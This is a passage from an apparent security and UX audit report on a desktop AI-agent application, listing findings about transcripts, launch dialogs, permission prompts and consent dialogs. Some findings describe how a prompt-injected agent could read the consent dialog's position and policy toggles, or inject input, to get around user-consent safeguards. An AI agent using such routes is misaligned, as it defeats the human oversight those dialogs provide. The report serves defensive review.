- **Where:** `runFind` scans only `Message` rows' `plain` (`ui/src/AgentPanel.cpp:2962-2968`); context menu exists only for Tool/Message rows (`:2696-2718`); selection overlay only for Message rows (`ui/src/TranscriptDelegate.cpp:1290-1322`)
- **What the user experiences:** tool names, paths, commands, results, thinking, and — worst — notes (where *every* error, compaction, rate-limit and API-failure line lives) are invisible to find: searching for the error text you're staring at yields "No matches". And precisely the strings a user pastes into a bug report (CLI error text, rate-limit reset time) are paint-only — not selectable, not copyable.
- **Fix sketch:** extend find's scan to Note/Tool/Thinking plain text (highlight can stay Message-only); add "Copy text" for Note/Thinking rows.
- **Effort:** small

### F49. The New Agent dialog's recommended default fails on any repo with no commits
- **Lens:** ux
- **Severity:** medium · **Confidence:** confirmed
- **Where:** sandbox checkbox maps to hard `"isolated"`, never `"auto"` (`ui/src/NewAgentDialog.cpp:223-229,348-349`); `worktree.Create` errors "isolation needs at least one commit" (`core/internal/worktree/worktree.go:126-129`); raw git-speak lands in the conversation (`ui/src/AgentPanel.cpp:3180-3184`)
- **What the user experiences:** on a fresh/never-committed project the recommended default launch fails with git jargon and no pre-flight hint.
- **Fix sketch:** map the checkbox to `"auto"`, or probe `git rev-parse HEAD` on project selection and disable the checkbox with an explanation.
- **Effort:** small

### F50. Smaller confirmed items (grouped)
- **Lens:** various · **Severity:** low (unless noted) · **Confidence:** as noted
- **Interrupt RPC has a null reply callback** (ux, confirmed): `AgentPanel.cpp:4392-4394` — if the RPC fails, the feed sits at "⏱ interrupting…" while the turn keeps running and billing. Fix: error-replacing callback.
- **Reconnect-window advice contradiction** (ux, confirmed): `AgentPanel.cpp:3009-3016` says "Restart Agent Kate to recover" while the reconnect ladder (which may succeed seconds later) is running. Text is preserved; only the advice is wrong.
- **a11y READ of AgentKate's own UI is unrestricted** (security, confirmed): `cowork.go:971-1051` (`listElements`/`readText` have no self-target check; the R2-only refusal at `consent.go:167`) — hands a prompt-injected agent exact bounds of the consent dialog and policy toggles, the targeting data F25/F26 need. Fix: refuse self windows on read; no legitimate agent use exists.
- **Span-0 `injectInput` queued behind the portal handshake plays into whatever is focused when the session comes up** (security, confirmed code / low reliability): `cowork.go:411`, `CoworkPortal.cpp:510-511` — focus re-verify is stale by then and the core watch is skipped for span 0. First-use-only. Fix: re-verify at dequeue, or establish the watch for handshake-queued batches.
- **ConsentDialog renders unknown capabilities as raw internal keys** (ux, confirmed): `ConsentDialog.cpp:16-31` lacks `launch_browser`/`vd_sandbox` — the browser-launch prompt reads "access your desktop (launch_browser)". CoworkPanel's own fuller map exists (`CoworkPanel.cpp:87-95`) — share it. Related: the scope combo pre-selects the core's `suggestedScope` = session for browser/screencast (`:99-104`); consider "once" as the universal preselection.
- **"Land into main" merges into the current branch, not necessarily main** (ux, confirmed): `WorktreeDashboard.cpp:182`, `AgentDock.cpp:289-294` vs `worktree.go:357-364`. Fix: "Land into workspace…".
- **Mode labels**: kimi `yolo` shows raw where claude's rung says "Expert — never ask" (`HarnessTraits.cpp:502-526`); "Ask before each step" overstates claude `default` (settings allow-rules pre-allow tools) — safe direction, weak overstatement.
- **Panel-rail shortcuts invisible** (ux, confirmed): Alt+1…9 / Ctrl+Alt+1…9 bound as raw QShortcuts (`MainWindow.cpp:1407-1432`), in no menu/tooltip; the palette can't surface them (walks menu-bar actions only). Fix: append to the (excellent) rail tooltips.
- **Discoverability nits** (ux, confirmed): "Ensemble" undefined at the decision point and "How clever?" for the model picker (`NewAgentDialog.cpp:58-66`); Skills/Language-extensions hidden in Simple mode though skills are a non-developer feature (`MainWindow.cpp:1141-1162,1348-1351`); the excellent command palette is advertised nowhere (WelcomeDialog points at Appearance instead); WelcomeDialog recents list has no empty state.
- **No taskbar-level "you are needed"** (ux, low-medium): static window title, no `KWindowSystem::demandAttention`; missed popup + window on another desktop = nothing. The persistent notification mitigates. Related observation: five simultaneous NeedsAttention popups are unbatched (defensible; an aggregate "N agents need you" matches the finish/fail precedent).
- **No composer input history** (ux, confirmed): Up/Down only navigates slash-completion (`AgentPanel.cpp:1935-1963`); iterating on a prompt means retyping. Fix: session-only ring buffer, Up on line 1.
- **Draft entries leak** (ux, hygiene): `clearDraft()` not called in `~AgentPanel`/`removeAgentEntry` — closed-with-draft leaves a config entry forever.
- **Selection overlay destroyed by find keystrokes** (ux, medium-high confidence): `setFind` emits full-range `dataChanged`; the panel closes the overlay whenever its row is in range — i.e. always, per keystroke — though only paint state changed.
- **Silent 5000-row eviction** (ux, confirmed): scroll-up hits a hard wall with no indication history is missing/on disk. Fix: sticky row 0 or a one-time note.
- **Replay renders the entire history synchronously** (ux, low-medium, unmeasured): `AgentPanel.cpp:2145-2147` pays markdown parse + row insertion even for rows the cap will evict; marathon-session resume = multi-second freeze. Fix: slice to the surviving tail first.
- **Transcript minors** (ux): notes carry no timestamp; `_stderr` renders `dim` not `err` (`AgentPanel.cpp:5963-5965`); adopting an already-limited thread shows only the header chip (feed note requires a transition); `SubAgentTranscriptDialog::pullNew` restores a stale scroll value after front-trim — live-tailing drifts.
- **Attach notice loop shows only the last failure** (ux, confirmed): `AgentPanel.cpp:4086-4088` per-reason loop vs the joined-list treatment `attachPaths` uses.
- **Jobs panel lacks cwd; worktree card lacks a "not isolated" pill** (ux, confirmed): `JobsPanel.cpp:133` (Job/Kind/State/Elapsed only); a workspace row shows "#3 main" looking like any isolated row (`WorktreeCardDelegate.cpp:93-134`).
- **"Sandbox desktop" naming** (ux, confirmed): organizational boundary named as containment (`CoworkPanel.cpp:74-76,107`) — fix with F32.
- **Ensemble delete Enter-defaults to Delete; kill-switch re-arm is a single unconfirmed click** (ux, confirmed): `EnsembleDialog.cpp:400-403`; `CoworkPanel.cpp:618-621` (mitigated: kill clears all toggles core-side).
- **LSP hover renders markdown images in an unguarded document** (security, low, medium confidence): `ui/src/lsp/LspHoverProvider.cpp:86-92` — `![x](file:///…)` survives `setMarkdownSafe` and `QToolTip` resolves local paths as in F15; attacker model is weak (content from the user-installed language server), but it's the mechanism the rest of the tree now guards by construction.
- **F24 stragglers carried** (all low): `CoreClient::call` invokes the callback synchronously on send-failure, contract still undocumented in the header (`CoreClient.cpp:277-285`); find-highlight per-paint O(row) rebuild (`TranscriptDelegate.cpp:218-233`); kimi threads silently skipped by skill-reload broadcast, no panel note (`handlers.go:2888-2895`); daemon tools still resolved via PATH per call; claude relay still ~5 parses/event; no cross-call rate limit on input injection.
- **Informational**: kimi event-log opens lack O_NOFOLLOW (inside 0700 root; trim staging file does use it); UI attachment image copies sit at 0644 until the next core start hardens them; four stale pre-fix `/tmp/agentkate-mcp-*.json` (0600) are never cleaned up.

## Surfaces audited and found sound

- **First-run backbone:** zero required decisions before the first prompt (Welcome → folder → starter agent with composer placeholder); plain-language jargon translation ("Ask before each step / Apply edits automatically", "In a private copy", sandbox checkbox written as a sentence); composer safe-failure (missing key aborts *before* send, keeps the draft, names the fix menu); dangerous modes never re-armed sticky; rail tooltips explain what each panel is *for*; secondary-panel empty states say what fills them.
- **The permission prompt's bones:** no Enter-to-approve (plain buttons in a non-dialog frame); no TOCTOU between render and grant (decision bound to requestId, `permission.respond` UI-only); timeout honesty (arrival stamp, prompt dropped at the broker deadline, countdown only in the last 2 minutes); background-agent prompts raise persistent deep-linking notifications naming the agent; vocabulary genuinely unified across engines (one broker, one bar, kimi's AskUserQuestion deliberately rendered as claude's); the nested `request_permission` gate double-prompts but never blinds (inner prompt carries the real input).
- **Worker-launch escalation prompt:** exemplary — summary built to the UI's 240-char budget with facts first and attacker-controlled text fitted last under reserves; effective isolation used ("auto" degraded to workspace reads as YOUR real files); approvals never cached; fail-closed when no human can be asked. Best-in-class honest labelling.
- **ControlConsentDialog (R2):** hardening verified real — ReturnGuard eats Enter in the phrase field, Deny explicitly default (comment's Qt claim checked), scope hard-coded once, thread named, a11y side effect disclosed; remaining Tab+Space path is documented with its three upstream guards. Sound.
- **Notification architecture:** strongest code read this pass — popup only when window inactive or a different agent on screen; attention latch against double-announce; persistent needs-attention retracted on answer/quit; click-to-raise with proper XDG activation token; 10 s storm coalescing with per-agent dedup; roster/markers/Jobs channels complementary; AttentionRaw/Attention split exactly right.
- **Stickiness security model:** bypassPermissions/dontAsk/yolo never sticky; Cowork explicitly not sticky with an explanatory comment; drafts/layout/tabs/geometry persisted; nothing sensitive in config groups.
- **Transcript engineering:** 50 ms coalescing flush; in-flight text painted as escaped plain (partial markdown isn't valid); authoritative event overwrites the provisional row via stable key; stableId-keyed caches with stale-height estimates on width change; single-row `dataChanged` mutations; system-event dispatch table with deliberate silences; compaction rendered as a boundary; model-fallback updates the picker; billed-vs-context distinction kept honest; bounded subagent accumulation; SafeContent on every rendered document.
- **Recovery paths:** akcore crash → bounded respawn ladder + handshake watchdog + honest terminal state; synthesized `_lifecycle/exited` settles half-streamed rows, fails in-flight jobs, restores queued text, marks agents resumable; interrupt confirmed in-band with half-stream cleanup; rate-limit/attachment/budget messages accurate and actionable.
- **Cowork revocation UX:** one panel with plain-language toggles, grant sentences, per-row revoke, tamper fail-closed status, and a kill-switch that clears policy + grants + sessions and accurately promises no more.
- **Honest labelling where it counts:** `manual` removal is genuine (probe-verified, documented); cleanup dialog "Safe"/blocked/pre-check semantics match the mechanism; non-isolated commit warns "not isolated"; auto-degradation surfaced post-launch ("Working directly in your files"); capability-gated options hidden *and withheld* per engine; cowork consent phrasing ("type and press keys **as you**") conveys acting with the user's identity.
- **Live probe (pass-1 open question):** claude `acceptEdits` does NOT auto-accept outside the session cwd — the UI's isolation language is not wrong in the default mode at the CLI layer (caveat: explicit `settings.json` allow rules).
- **Hygiene:** `go vet` clean; `go test ./...` all green; `ctest` 13/13 including the new MarkdownUtil/SafeContent/AttachmentBuilder/AgentNotifier suites.

## Not audited / blocked

- **Live driving of the full UI** (offscreen or desktop app run) was not done; UX findings are code-traced, and KMessageBox default-button behavior was verified from KF6 headers rather than at runtime. F39/F40's rendering claims and F43's impact (does a limited CLI wait or error?) deserve a live session.
- **`remote-*` feature** (carried from pass 1): still unaudited, still the top recommendation for a dedicated pass — if it exposes sessions over the network it dwarfs every finding here.
- **kimi ACP mid-session mode vocabulary** (carried from pass 1); kimi CLI's own stores; supply chain — still untouched.
- **KDE portal dialog wording** — external component, not assessable from this tree.
- **TerminalPanel (Konsole part), LSP subsystem depth** — skimmed; one LSP hover issue filed in passing (F50).
- **F25/F26 attack chains** are code-traced and deterministic by construction but were not executed against a live portal session (requires a consent-armed desktop).
